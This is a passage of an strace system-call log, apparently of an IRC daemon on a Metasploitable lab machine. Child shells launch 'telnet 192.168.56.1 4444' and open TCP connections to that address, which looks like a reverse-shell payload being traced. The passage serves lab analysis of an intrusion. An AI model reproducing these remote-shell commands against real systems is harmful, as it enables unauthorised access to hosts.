+[pid  4974] 15:03:28.960431 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\000"..., 512) = 512
+[pid  4974] 15:03:28.960454 fstat64(5, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
+[pid  4974] 15:03:28.960487 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d4d000
+[pid  4974] 15:03:28.960500 mmap2(0xb7d54000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x6) = 0xb7d54000
+[pid  4974] 15:03:28.960521 close(5)    = 0
+[pid  4974] 15:03:28.960534 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.960551 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 5
+[pid  4974] 15:03:28.960572 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\000"..., 512) = 512
+[pid  4974] 15:03:28.960594 fstat64(5, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
+[pid  4974] 15:03:28.960627 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d35000
+[pid  4974] 15:03:28.960638 mmap2(0xb7d49000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x13) = 0xb7d49000
+[pid  4974] 15:03:28.960656 mmap2(0xb7d4b000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d4b000
+[pid  4974] 15:03:28.960673 close(5)    = 0
+[pid  4974] 15:03:28.960706 munmap(0xb7edb000, 29338) = 0
+[pid  4974] 15:03:28.960727 open("/etc/ld.so.cache", O_RDONLY) = 5
+[pid  4974] 15:03:28.960743 fstat64(5, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4974] 15:03:28.960775 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 5, 0) = 0xb7edb000
+[pid  4974] 15:03:28.960786 close(5)    = 0
+[pid  4974] 15:03:28.960799 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.960821 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 5
+[pid  4974] 15:03:28.960842 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0"..., 512) = 512
+[pid  4974] 15:03:28.960864 fstat64(5, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
+[pid  4974] 15:03:28.960896 brk(0x80ff000) = 0x80ff000
+[pid  4974] 15:03:28.960910 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d2b000
+[pid  4974] 15:03:28.960922 mmap2(0xb7d33000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x7) = 0xb7d33000
+[pid  4974] 15:03:28.960942 close(5)    = 0
+[pid  4974] 15:03:28.960957 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4974] 15:03:28.960974 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 5
+[pid  4974] 15:03:28.961015 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30"..., 512) = 512
+[pid  4974] 15:03:28.961047 fstat64(5, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
+[pid  4974] 15:03:28.961090 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7d20000
+[pid  4974] 15:03:28.961102 mmap2(0xb7d29000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x8) = 0xb7d29000
+[pid  4974] 15:03:28.961123 close(5)    = 0
+[pid  4974] 15:03:28.961147 munmap(0xb7edb000, 29338) = 0
+[pid  4974] 15:03:28.961165 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 5
+[pid  4974] 15:03:28.961182 fcntl64(5, F_GETFD) = 0x1 (flags FD_CLOEXEC)
+[pid  4974] 15:03:28.961195 _llseek(5, 0, [0], SEEK_CUR) = 0
+[pid  4974] 15:03:28.961209 fstat64(5, {st_mode=S_IFREG|0644, st_size=1581, ...}) = 0
+[pid  4974] 15:03:28.961242 mmap2(NULL, 1581, PROT_READ, MAP_SHARED, 5, 0) = 0xb7ee2000
+[pid  4974] 15:03:28.961263 _llseek(5, 1581, [1581], SEEK_SET) = 0
+[pid  4974] 15:03:28.961292 munmap(0xb7ee2000, 1581) = 0
+[pid  4974] 15:03:28.961314 close(5)    = 0
+[pid  4974] 15:03:28.961354 brk(0x8100000) = 0x8100000
+[pid  4974] 15:03:28.961373 getpgrp()   = 3958
+[pid  4974] 15:03:28.961383 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+[pid  4974] 15:03:28.961407 getrlimit(RLIMIT_NPROC, {rlim_cur=36*1024, rlim_max=36*1024}) = 0
+[pid  4974] 15:03:28.961428 brk(0x8101000) = 0x8101000
+[pid  4974] 15:03:28.961460 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4974] 15:03:28.961477 fcntl64(0, F_GETFL) = 0 (flags O_RDONLY)
+[pid  4974] 15:03:28.961490 fstat64(0, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+[pid  4974] 15:03:28.961572 _llseek(0, 0, 0xbffba330, SEEK_CUR) = -1 ESPIPE (Illegal seek)
+[pid  4974] 15:03:28.961585 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4974] 15:03:28.961608 read(0,  <unfinished ...>
+[pid  4970] 15:03:28.961640 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+[pid  4970] 15:03:28.961655 close(5)    = 0
+[pid  4970] 15:03:28.961665 close(6)    = 0
+[pid  4970] 15:03:28.961675 close(5)    = -1 EBADF (Bad file descriptor)
+[pid  4970] 15:03:28.961686 close(6)    = -1 EBADF (Bad file descriptor)
+[pid  4970] 15:03:28.961721 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [CHLD], 8) = 0
+[pid  4970] 15:03:28.961739 clone(Process 4975 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d9e6f8) = 4975
+[pid  4975] 15:03:28.961821 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4975] 15:03:28.961840 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4975] 15:03:28.961861 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4975] 15:03:28.961880 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4975] 15:03:28.961944 dup2(1, 0)  = 0
+[pid  4975] 15:03:28.961955 close(1)    = 0
+[pid  4975] 15:03:28.962023 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4975] 15:03:28.962060 stat64("/sbin/telnet", 0xbf95c588) = -1 ENOENT (No such file or directory)
+[pid  4975] 15:03:28.962077 stat64("/bin/telnet", 0xbf95c588) = -1 ENOENT (No such file or directory)
+[pid  4975] 15:03:28.962092 stat64("/usr/sbin/telnet", 0xbf95c588) = -1 ENOENT (No such file or directory)
+[pid  4975] 15:03:28.962109 stat64("/usr/bin/telnet", {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+[pid  4975] 15:03:28.962148 stat64("/usr/bin/telnet", {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+[pid  4975] 15:03:28.962195 rt_sigaction(SIGINT, {SIG_DFL}, {0x8091fd0, [], 0}, 8) = 0
+[pid  4975] 15:03:28.962216 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4975] 15:03:28.962236 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  4975] 15:03:28.962256 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  4975] 15:03:28.962276 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4975] 15:03:28.962303 open("/dev/null", O_WRONLY|O_CREAT|O_TRUNC|O_LARGEFILE, 0666) = 1
+[pid  4975] 15:03:28.962324 dup2(1, 2)  = 2
+[pid  4975] 15:03:28.962340 fcntl64(1, F_GETFD) = 0
+[pid  4975] 15:03:28.962356 execve("/usr/bin/telnet", ["telnet", "192.168.56.1", "4444"], [/* 14 vars */] <unfinished ...>
+[pid  4973] 15:03:28.968432 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4970] 15:03:28.968522 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
+[pid  4973] 15:03:28.968557 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  4970] 15:03:28.968571 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  4970] 15:03:28.968578 close(1)    = 0
+[pid  4970] 15:03:28.968596 rt_sigprocmask(SIG_BLOCK, [CHLD], [CHLD], 8) = 0
+[pid  4973] 15:03:28.968612 <... rt_sigprocmask resumed> [], 8) = 0
+[pid  4970] 15:03:28.968624 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  4973] 15:03:28.968638 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
+[pid  4970] 15:03:28.968648 <... rt_sigprocmask resumed> [CHLD], 8) = 0
+[pid  4970] 15:03:28.968657 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
+[pid  4973] 15:03:28.968667 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  4970] 15:03:28.968673 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  4973] 15:03:28.968680 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  4970] 15:03:28.968690 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  4973] 15:03:28.968700 <... rt_sigprocmask resumed> [], 8) = 0
+[pid  4970] 15:03:28.968708 <... rt_sigprocmask resumed> [CHLD], 8) = 0
+[pid  4973] 15:03:28.968718 rt_sigaction(SIGINT, {0x807f150, [], 0},  <unfinished ...>
+[pid  4970] 15:03:28.968732 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+[pid  4973] 15:03:28.968744 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  4970] 15:03:28.968756 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  4973] 15:03:28.968766 rt_sigaction(SIGINT, {SIG_IGN},  <unfinished ...>
+[pid  4970] 15:03:28.968778 <... rt_sigprocmask resumed> [CHLD], 8) = 0
+[pid  4973] 15:03:28.968787 <... rt_sigaction resumed> {0x807f150, [], 0}, 8) = 0
+[pid  4970] 15:03:28.968799 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
+[pid  4973] 15:03:28.968817 waitpid(-1, Process 4973 suspended
+ <unfinished ...>
+[pid  4970] 15:03:28.968825 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  4970] 15:03:28.968831 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
+[pid  4970] 15:03:28.968844 close(1)    = -1 EBADF (Bad file descriptor)
+[pid  4970] 15:03:28.968855 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4970] 15:03:28.968948 exit_group(0) = ?
+Process 4969 resumed
+Process 4970 detached
+[pid  4969] 15:03:28.968989 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 4970
+[pid  4969] 15:03:28.969008 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4969] 15:03:28.969021 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  4969] 15:03:28.969029 waitpid(-1, 0xbf95c738, WNOHANG) = -1 ECHILD (No child processes)
+[pid  4969] 15:03:28.969040 sigreturn() = ? (mask now [])
+[pid  4969] 15:03:28.969071 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
+[pid  4969] 15:03:28.969133 exit_group(0) = ?
+Process 4967 resumed
+Process 4969 detached
+[pid  4967] 15:03:28.969169 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 4969
+[pid  4967] 15:03:28.969182 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4967] 15:03:28.969194 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  4967] 15:03:28.969201 waitpid(-1, 0xbf885c68, WNOHANG) = -1 ECHILD (No child processes)
+[pid  4967] 15:03:28.969212 sigreturn() = ? (mask now [])
+[pid  4967] 15:03:28.969242 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
+[pid  4967] 15:03:28.969306 exit_group(0) = ?
+Process 4618 resumed
+Process 4967 detached
+[pid  4618] 15:03:28.969346 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 4967
+[pid  4618] 15:03:28.969359 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
+[pid  4618] 15:03:28.969376 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
+[pid  4618] 15:03:28.969391 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4618] 15:03:28.969403 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  4618] 15:03:28.969429 send(4, ":irc.Metasploitable.LAN 451 AB;s"..., 60, 0) = 60
+[pid  4618] 15:03:28.969543 time(NULL)  = 1478462608
+[pid  4618] 15:03:28.969555 time(NULL)  = 1478462608
+[pid  4618] 15:03:28.969583 gettimeofday({1478462608, 969587}, NULL) = 0
+[pid  4618] 15:03:28.969599 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+[pid  4618] 15:03:28.969673 clock_gettime(CLOCK_MONOTONIC, {2534, 432670354}) = 0
+[pid  4618] 15:03:28.969688 gettimeofday({1478462608, 969692}, NULL) = 0
+[pid  4618] 15:03:28.969701 select(1024, [2 3 4], [], NULL, {1, 0} <unfinished ...>
+[pid  4972] 15:03:28.972418 <... execve resumed> ) = 0
+[pid  4972] 15:03:28.972442 brk(0)      = 0x805d000
+[pid  4972] 15:03:28.972471 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.972492 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7efe000
+[pid  4972] 15:03:28.972512 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.972536 open("/etc/ld.so.cache", O_RDONLY) = 5
+[pid  4972] 15:03:28.972552 fstat64(5, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4972] 15:03:28.972586 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 5, 0) = 0xb7ef6000
+[pid  4972] 15:03:28.972597 close(5)    = 0
+[pid  4972] 15:03:28.972610 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.972632 open("/lib/libncurses.so.5", O_RDONLY) = 5
+[pid  4972] 15:03:28.972650 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220"..., 512) = 512
+[pid  4972] 15:03:28.972674 fstat64(5, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+[pid  4972] 15:03:28.972707 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7ec6000
+[pid  4972] 15:03:28.972721 mmap2(0xb7ef3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x2c) = 0xb7ef3000
+[pid  4972] 15:03:28.972741 close(5)    = 0
+[pid  4972] 15:03:28.972754 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.972773 open("/usr/lib/libstdc++.so.6", O_RDONLY) = 5
+[pid  4972] 15:03:28.972792 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0`*\4\000"..., 512) = 512
+[pid  4972] 15:03:28.972814 fstat64(5, {st_mode=S_IFREG|0644, st_size=970680, ...}) = 0
+[pid  4972] 15:03:28.972848 mmap2(NULL, 993036, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7dd3000
+[pid  4972] 15:03:28.972860 mmap2(0xb7ebb000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0xe8) = 0xb7ebb000
+[pid  4972] 15:03:28.972877 mmap2(0xb7ec0000, 22284, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ec0000
+[pid  4972] 15:03:28.972894 close(5)    = 0
+[pid  4972] 15:03:28.972908 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.972924 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 5
+[pid  4972] 15:03:28.972945 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\000"..., 512) = 512
+[pid  4972] 15:03:28.972966 fstat64(5, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
+[pid  4972] 15:03:28.972999 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dd2000
+[pid  4972] 15:03:28.973013 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7dad000
+[pid  4972] 15:03:28.973024 mmap2(0xb7dd0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x23) = 0xb7dd0000
+[pid  4972] 15:03:28.973044 close(5)    = 0
+[pid  4972] 15:03:28.973058 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.973076 open("/lib/libgcc_s.so.1", O_RDONLY) = 5
+[pid  4972] 15:03:28.973092 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\31\0\000"..., 512) = 512
+[pid  4972] 15:03:28.973113 fstat64(5, {st_mode=S_IFREG|0644, st_size=42700, ...}) = 0
+[pid  4972] 15:03:28.973146 mmap2(NULL, 41700, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7da2000
+[pid  4972] 15:03:28.973158 mmap2(0xb7dac000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0xa) = 0xb7dac000
+[pid  4972] 15:03:28.973173 close(5)    = 0
+[pid  4972] 15:03:28.973187 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.973203 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 5
+[pid  4972] 15:03:28.973223 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  4972] 15:03:28.973244 fstat64(5, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  4972] 15:03:28.973276 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7c53000
+[pid  4972] 15:03:28.973288 mmap2(0xb7d9c000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x149) = 0xb7d9c000
+[pid  4972] 15:03:28.973305 mmap2(0xb7d9f000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d9f000
+[pid  4972] 15:03:28.973321 close(5)    = 0
+[pid  4972] 15:03:28.973336 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4972] 15:03:28.973353 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 5
+[pid  4972] 15:03:28.973372 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\000"..., 512) = 512
+[pid  4972] 15:03:28.973393 fstat64(5, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+[pid  4972] 15:03:28.973426 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7c4f000
+[pid  4972] 15:03:28.973437 mmap2(0xb7c51000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x1) = 0xb7c51000
+[pid  4972] 15:03:28.973456 close(5)    = 0
+[pid  4972] 15:03:28.973486 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7c4e000
+[pid  4972] 15:03:28.973501 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7c4e940, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  4972] 15:03:28.973589 mprotect(0xb7d9c000, 4096, PROT_READ) = 0
+[pid  4972] 15:03:28.973866 mprotect(0xb7ebb000, 12288, PROT_READ) = 0
+[pid  4972] 15:03:28.973906 munmap(0xb7ef6000, 29338) = 0
+[pid  4972] 15:03:28.974006 brk(0)      = 0x805d000
+[pid  4972] 15:03:28.974017 brk(0x8082000) = 0x8082000
+[pid  4972] 15:03:28.974056 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART}, {SIG_DFL}, 8) = 0
+[pid  4972] 15:03:28.974083 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfadb7a8) = -1 EINVAL (Invalid argument)
+[pid  4972] 15:03:28.974104 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4972] 15:03:28.974133 socket(PF_NETLINK, SOCK_RAW, 0) = 5
+[pid  4972] 15:03:28.974152 bind(5, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 0
+[pid  4972] 15:03:28.974170 getsockname(5, {sa_family=AF_NETLINK, pid=4972, groups=00000000}, [12]) = 0
+[pid  4972] 15:03:28.974212 time(NULL)  = 1478462608
+[pid  4972] 15:03:28.974228 sendto(5, "\24\0\0\0\26\0\1\3\220\214\37X\0\0\0\0\0\0\0\0", 20, 0, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 20
+[pid  4972] 15:03:28.974258 recvmsg(5, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"0\0\0\0\24\0\2\0\220\214\37Xl\23\0\0\2\10\200\376\1\0\0"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 108
+[pid  4972] 15:03:28.974299 recvmsg(5, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"@\0\0\0\24\0\2\0\220\214\37Xl\23\0\0\n\200\200\376\1\0"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 128
+[pid  4972] 15:03:28.974337 recvmsg(5, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"\24\0\0\0\3\0\2\0\220\214\37Xl\23\0\0\0\0\0\0\1\0\0\0\24"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 20
+[pid  4972] 15:03:28.974369 close(5)    = 0
+[pid  4972] 15:03:28.974414 fstat64(1, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+[pid  4972] 15:03:28.974450 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7efd000
+[pid  4972] 15:03:28.974466 close(-1)   = -1 EBADF (Bad file descriptor)
+[pid  4972] 15:03:28.974481 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 5
+[pid  4972] 15:03:28.974499 setsockopt(5, SOL_IP, IP_TOS, [16], 4) = 0
+[pid  4972] 15:03:28.974515 connect(5, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.56.1")}, 16 <unfinished ...>
+[pid  4975] 15:03:28.974604 <... execve resumed> ) = 0
+[pid  4975] 15:03:28.974627 brk(0)      = 0x805d000
+[pid  4975] 15:03:28.974654 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4975] 15:03:28.974673 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
+[pid  4975] 15:03:28.974692 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  4975] 15:03:28.974714 open("/etc/ld.so.cache", O_RDONLY) = 5
+[pid  4975] 15:03:28.974730 fstat64(5, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4975] 15:03:28.974763 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 5, 0) = 0xb7fd2000
+[pid  4975] 15:03:28.974773 close(5)    = 0
+[pid  4975] 15:03:28.974786 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4975] 15:03:28.974808 open("/lib/libncurses.so.5", O_RDONLY) = 5
+[pid  4975] 15:03:28.974840 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220"..., 512) = 512
+[pid  4975] 15:03:28.974864 fstat64(5, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+[pid  4975] 15:03:28.974897 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7fa2000
+[pid  4975] 15:03:28.974910 mmap2(0xb7fcf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x2c) = 0xb7fcf000
+[pid  4975] 15:03:28.974930 close(5)    = 0
+[pid  4975] 15:03:28.974943 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4975] 15:03:28.974962 open("/usr/lib/libstdc++.so.6", O_RDONLY) = 5
+[pid  4975] 15:03:28.974979 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0`*\4\000"..., 512) = 512
+[pid  4975] 15:03:28.975000 fstat64(5, {st_mode=S_IFREG|0644, st_size=970680, ...}) = 0
+[pid  4975] 15:03:28.975035 mmap2(NULL, 993036, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7eaf000
+[pid  4975] 15:03:28.975047 mmap2(0xb7f97000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0xe8) = 0xb7f97000
+[pid  4975] 15:03:28.975063 mmap2(0xb7f9c000, 22284, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f9c000
+[pid  4975] 15:03:28.975079 close(5)    = 0
+[pid  4975] 15:03:28.975092 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4975] 15:03:28.975109 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 5
+[pid  4975] 15:03:28.975128 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\000"..., 512) = 512
+[pid  4975] 15:03:28.975149 fstat64(5, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
+[pid  4975] 15:03:28.975181 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eae000
+[pid  4975] 15:03:28.975195 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7e89000
+[pid  4975] 15:03:28.975207 mmap2(0xb7eac000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x23) = 0xb7eac000
+[pid  4975] 15:03:28.975225 close(5)    = 0
+[pid  4975] 15:03:28.975239 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4975] 15:03:28.975257 open("/lib/libgcc_s.so.1", O_RDONLY) = 5
